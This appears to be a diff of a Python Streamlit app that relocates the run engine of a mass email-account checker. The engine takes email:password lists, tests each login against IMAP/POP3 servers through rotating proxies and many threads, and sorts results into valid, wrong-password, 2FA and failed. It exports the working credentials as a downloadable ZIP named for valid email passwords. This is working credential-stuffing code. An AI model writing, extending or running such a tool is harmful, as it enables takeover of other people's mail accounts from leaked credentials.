@@ -720,186 +720,6 @@ if raw_text:
     col_m4.metric("Resume Skipped", resume)
     col_m5.metric("App-Skipped", app_skip)
 
-# --- Execution Trigger & Dual-Tab Report Log Integration (Moved Here Right Below Input) ---
-st.markdown("---")
-st.markdown("### 🚀 Execute Live Checking Engine")
-
-if st.button("🔥 Start Live Checking Engine", type="primary"):
-    if not clean_lines:
-        st.warning("⚠️ Please load and filter accounts first.")
-    else:
-        active_proxy_pool = get_filtered_active_proxies()
-        
-        valid_results = []
-        wrong_results = []
-        need_app_results = []
-        conn_results = []
-        
-        progress_bar = st.progress(0)
-        status_text = st.empty()
-        
-        # Dedicated Tabs for Execution Display and Detailed Live Report Log
-        exec_tab1, exec_tab2 = st.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
-        
-        with exec_tab1:
-            log_container = st.empty()
-        
-        with exec_tab2:
-            report_metrics_placeholder = st.empty()
-            report_log_container = st.empty()
-
-        log_lines = []
-        report_entries = []
-        
-        accounts_to_check = clean_lines[:CFG["MAX_ACCOUNTS"]] if CFG["MAX_ACCOUNTS"] > 0 else clean_lines
-        total_accs = len(accounts_to_check)
-        checked_count = 0
-        
-        thread_local = threading.local()
-        
-        def check_task(line):
-            try:
-                if ":" not in line: 
-                    return {"line": f"{line} | Error: Invalid format", "status": "connection_failed"}
-                email, password = line.split(":", 1)
-                email, password = email.strip(), password.strip()
-                domain = email.split("@")[-1].lower()
-                conf = get_servers(email)
-                
-                if not hasattr(thread_local, "state"):
-                    thread_local.state = {}
-                
-                server, status, detail, px_used = check_account_sync(email, password, conf, domain, active_proxy_pool, thread_local.state)
-                return {"line": f"{email}:{password} | {detail}", "email": email, "status": status, "detail": detail}
-            except Exception as ex:
-                return {"line": f"{line} | Error: {ex}", "email": line, "status": "connection_failed", "detail": str(ex)}
-
-        current_workers = CFG["MAX_WORKERS_START"]
-
-        try:
-            with ThreadPoolExecutor(max_workers=current_workers) as executor:
-                future_to_line = {executor.submit(check_task, line): line for line in accounts_to_check}
-                
-                for future in as_completed(future_to_line):
-                    checked_count += 1
-                    try:
-                        res = future.result(timeout=CFG["ACCOUNT_DEADLINE"])
-                        if res:
-                            st_val = res["status"]
-                            if st_val == "valid":
-                                valid_results.append(res["line"])
-                            elif st_val == "wrong_password":
-                                wrong_results.append(res["line"])
-                            elif st_val == "need_app_password":
-                                need_app_results.append(res["line"])
-                            else:
-                                conn_results.append(res["line"])
-                            
-                            log_msg = f"[{st_val.upper()}] {res.get('email', '')} -> {res.get('detail', '')}"
-                            log_lines.append(log_msg)
-                            if len(log_lines) > 50:
-                                log_lines.pop(0)
-                            log_container.code("\n".join(log_lines), language="text")
-
-                            # Update Dedicated Report Log Tab
-                            report_entries.append({
-                                "Time": datetime.now().strftime("%H:%M:%S"),
-                                "Email": res.get("email", ""),
-                                "Status": st_val.upper(),
-                                "Detail": res.get("detail", "")
-                            })
-                            
-                            with report_metrics_placeholder.container():
-                                r_col1, r_col2, r_col3, r_col4 = st.columns(4)
-                                r_col1.metric("✅ Valid", len(valid_results))
-                                r_col2.metric("❌ Wrong", len(wrong_results))
-                                r_col3.metric("🔑 AppPass", len(need_app_results))
-                                r_col4.metric("⚠️ Failed", len(conn_results))
-
-                            df_report = pd.DataFrame(report_entries[::-1]) # Latest first
-                            report_log_container.dataframe(df_report, width='stretch', height=250)
-                            
-                    except Exception as ex:
-                        err_msg = f"[EXCEPTION] {str(ex)}"
-                        conn_results.append(err_msg)
-                        log_lines.append(err_msg)
-                        log_container.code("\n".join(log_lines), language="text")
-                    
-                    if total_accs > 0:
-                        progress_bar.progress(min(1.0, checked_count / total_accs))
-                    status_text.text(f"Checking... {checked_count}/{total_accs} | Valid: {len(valid_results)} | Wrong: {len(wrong_results)}")
-        except Exception as ex:
-            st.error(f"Execution thread block error: {ex}")
-
-        progress_bar.empty()
-        status_text.success("🎉 Check Complete!")
-        
-        try:
-            stamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            valid_path = os.path.join(CFG["RESULTS_DIR"], f"valid_{stamp}.txt")
-            wrong_path = os.path.join(CFG["RESULTS_DIR"], f"wrong_{stamp}.txt")
-            need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
-            failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
-
-            with open(valid_path, "w", encoding="utf-8") as f:
-                f.write("\n".join(str(item) for item in valid_results) + ("\n" if valid_results else ""))
-            with open(wrong_path, "w", encoding="utf-8") as f:
-                f.write("\n".join(str(item) for item in wrong_results) + ("\n" if wrong_results else ""))
-            with open(need_path, "w", encoding="utf-8") as f:
-                f.write("\n".join(str(item) for item in need_app_results) + ("\n" if need_app_results else ""))
-            with open(failed_path, "w", encoding="utf-8") as f:
-                f.write("\n".join(str(item) for item in conn_results) + ("\n" if conn_results else ""))
-
-            clean_valid_path = "clean_valid_accounts.txt"
-            clean_valid_count = 0
-            with open(clean_valid_path, "w", encoding="utf-8") as outfile:
-                for line in valid_results:
-                    try:
-                        parts = line.split(":")
-                        if len(parts) >= 2:
-                            email = parts[0].strip()
-                            password_part = parts[1].split("|")[0].strip()
-                            outfile.write(f"{email}:{password_part}\n")
-                            clean_valid_count += 1
-                    except Exception:
-                        continue
-
-            zip_name = f"mail_results_{stamp}.zip"
-            with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
-                if os.path.exists(clean_valid_path):
-                    z.write(clean_valid_path, arcname="valid_email_password.txt")
-                if os.path.exists(wrong_path):
-                    z.write(wrong_path, arcname=os.path.basename(wrong_path))
-                if os.path.exists(need_path):
-                    z.write(need_path, arcname=os.path.basename(need_path))
-                if os.path.exists(failed_path):
-                    z.write(failed_path, arcname=os.path.basename(failed_path))
-
-            st.markdown("---")
-            st.markdown("### 📊 Live Results Summary & ZIP Archive")
-            col1, col2, col3, col4 = st.columns(4)
-            col1.metric("✅ Clean Valid", clean_valid_count)
-            col2.metric("❌ Wrong Password", len(wrong_results))
-            col3.metric("🔑 App Password / 2FA", len(need_app_results))
-            col4.metric("⚠️ Connection Failed", len(conn_results))
-            
-            if valid_results:
-                st.markdown("#### ✅ Valid Accounts Found:")
-                for v in valid_results:
-                    st.code(v, language="text")
-
-            with open(zip_name, "rb") as fp:
-                zip_bytes = fp.read()
-
-            st.download_button(
-                label="📦 Download All Results (.zip Package)",
-                data=zip_bytes,
-                file_name=zip_name,
-                mime="application/zip"
-            )
-        except Exception as ex:
-            st.error(f"Error compiling results export files: {ex}")
-
 # --- Checking Protocol Functions ---
 PROVIDER_MAP = {
     "gmail.com": {"imap": ["imap.gmail.com"], "pop3": ["pop.gmail.com"]},
@@ -1197,3 +1017,183 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state):
         return None, "connection_failed", str(e)[:40], None
 
     return None, "connection_failed", "all hosts failed", None
+
+# --- Execution Trigger & Dual-Tab Report Log Integration ---
+st.markdown("---")
+st.markdown("### 🚀 Execute Live Checking Engine")
+
+if st.button("🔥 Start Live Checking Engine", type="primary"):
+    if not clean_lines:
+        st.warning("⚠️ Please load and filter accounts first.")
+    else:
+        active_proxy_pool = get_filtered_active_proxies()
+        
+        valid_results = []
+        wrong_results = []
+        need_app_results = []
+        conn_results = []
+        
+        progress_bar = st.progress(0)
+        status_text = st.empty()
+        
+        # Dedicated Tabs for Execution Display and Detailed Live Report Log
+        exec_tab1, exec_tab2 = st.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
+        
+        with exec_tab1:
+            log_container = st.empty()
+        
+        with exec_tab2:
+            report_metrics_placeholder = st.empty()
+            report_log_container = st.empty()
+
+        log_lines = []
+        report_entries = []
+        
+        accounts_to_check = clean_lines[:CFG["MAX_ACCOUNTS"]] if CFG["MAX_ACCOUNTS"] > 0 else clean_lines
+        total_accs = len(accounts_to_check)
+        checked_count = 0
+        
+        thread_local = threading.local()
+        
+        def check_task(line):
+            try:
+                if ":" not in line: 
+                    return {"line": f"{line} | Error: Invalid format", "status": "connection_failed"}
+                email, password = line.split(":", 1)
+                email, password = email.strip(), password.strip()
+                domain = email.split("@")[-1].lower()
+                conf = get_servers(email)
+                
+                if not hasattr(thread_local, "state"):
+                    thread_local.state = {}
+                
+                server, status, detail, px_used = check_account_sync(email, password, conf, domain, active_proxy_pool, thread_local.state)
+                return {"line": f"{email}:{password} | {detail}", "email": email, "status": status, "detail": detail}
+            except Exception as ex:
+                return {"line": f"{line} | Error: {ex}", "email": line, "status": "connection_failed", "detail": str(ex)}
+
+        current_workers = CFG["MAX_WORKERS_START"]
+
+        try:
+            with ThreadPoolExecutor(max_workers=current_workers) as executor:
+                future_to_line = {executor.submit(check_task, line): line for line in accounts_to_check}
+                
+                for future in as_completed(future_to_line):
+                    checked_count += 1
+                    try:
+                        res = future.result(timeout=CFG["ACCOUNT_DEADLINE"])
+                        if res:
+                            st_val = res["status"]
+                            if st_val == "valid":
+                                valid_results.append(res["line"])
+                            elif st_val == "wrong_password":
+                                wrong_results.append(res["line"])
+                            elif st_val == "need_app_password":
+                                need_app_results.append(res["line"])
+                            else:
+                                conn_results.append(res["line"])
+                            
+                            log_msg = f"[{st_val.upper()}] {res.get('email', '')} -> {res.get('detail', '')}"
+                            log_lines.append(log_msg)
+                            if len(log_lines) > 50:
+                                log_lines.pop(0)
+                            log_container.code("\n".join(log_lines), language="text")
+
+                            # Update Dedicated Report Log Tab
+                            report_entries.append({
+                                "Time": datetime.now().strftime("%H:%M:%S"),
+                                "Email": res.get("email", ""),
+                                "Status": st_val.upper(),
+                                "Detail": res.get("detail", "")
+                            })
+                            
+                            with report_metrics_placeholder.container():
+                                r_col1, r_col2, r_col3, r_col4 = st.columns(4)
+                                r_col1.metric("✅ Valid", len(valid_results))
+                                r_col2.metric("❌ Wrong", len(wrong_results))
+                                r_col3.metric("🔑 AppPass", len(need_app_results))
+                                r_col4.metric("⚠️ Failed", len(conn_results))
+
+                            df_report = pd.DataFrame(report_entries[::-1]) # Latest first
+                            report_log_container.dataframe(df_report, width='stretch', height=250)
+                            
+                    except Exception as ex:
+                        err_msg = f"[EXCEPTION] {str(ex)}"
+                        conn_results.append(err_msg)
+                        log_lines.append(err_msg)
+                        log_container.code("\n".join(log_lines), language="text")
+                    
+                    if total_accs > 0:
+                        progress_bar.progress(min(1.0, checked_count / total_accs))
+                    status_text.text(f"Checking... {checked_count}/{total_accs} | Valid: {len(valid_results)} | Wrong: {len(wrong_results)}")
+        except Exception as ex:
+            st.error(f"Execution thread block error: {ex}")
+
+        progress_bar.empty()
+        status_text.success("🎉 Check Complete!")
+        
+        try:
+            stamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+            valid_path = os.path.join(CFG["RESULTS_DIR"], f"valid_{stamp}.txt")
+            wrong_path = os.path.join(CFG["RESULTS_DIR"], f"wrong_{stamp}.txt")
+            need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
+            failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
+
+            with open(valid_path, "w", encoding="utf-8") as f:
+                f.write("\n".join(str(item) for item in valid_results) + ("\n" if valid_results else ""))
+            with open(wrong_path, "w", encoding="utf-8") as f:
+                f.write("\n".join(str(item) for item in wrong_results) + ("\n" if wrong_results else ""))
+            with open(need_path, "w", encoding="utf-8") as f:
+                f.write("\n".join(str(item) for item in need_app_results) + ("\n" if need_app_results else ""))
+            with open(failed_path, "w", encoding="utf-8") as f:
+                f.write("\n".join(str(item) for item in conn_results) + ("\n" if conn_results else ""))
+
+            clean_valid_path = "clean_valid_accounts.txt"
+            clean_valid_count = 0
+            with open(clean_valid_path, "w", encoding="utf-8") as outfile:
+                for line in valid_results:
+                    try:
+                        parts = line.split(":")
+                        if len(parts) >= 2:
+                            email = parts[0].strip()
+                            password_part = parts[1].split("|")[0].strip()
+                            outfile.write(f"{email}:{password_part}\n")
+                            clean_valid_count += 1
+                    except Exception:
+                        continue
+
+            zip_name = f"mail_results_{stamp}.zip"
+            with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
+                if os.path.exists(clean_valid_path):
+                    z.write(clean_valid_path, arcname="valid_email_password.txt")
+                if os.path.exists(wrong_path):
+                    z.write(wrong_path, arcname=os.path.basename(wrong_path))
+                if os.path.exists(need_path):
+                    z.write(need_path, arcname=os.path.basename(need_path))
+                if os.path.exists(failed_path):
+                    z.write(failed_path, arcname=os.path.basename(failed_path))
+
+            st.markdown("---")
+            st.markdown("### 📊 Live Results Summary & ZIP Archive")
+            col1, col2, col3, col4 = st.columns(4)
+            col1.metric("✅ Clean Valid", clean_valid_count)
+            col2.metric("❌ Wrong Password", len(wrong_results))
+            col3.metric("🔑 App Password / 2FA", len(need_app_results))
+            col4.metric("⚠️ Connection Failed", len(conn_results))
+            
+            if valid_results:
+                st.markdown("#### ✅ Valid Accounts Found:")
+                for v in valid_results:
+                    st.code(v, language="text")
+
+            with open(zip_name, "rb") as fp:
+                zip_bytes = fp.read()
+
+            st.download_button(
+                label="📦 Download All Results (.zip Package)",
+                data=zip_bytes,
+                file_name=zip_name,
+                mime="application/zip"
+            )
+        except Exception as ex:
+            st.error(f"Error compiling results export files: {ex}")
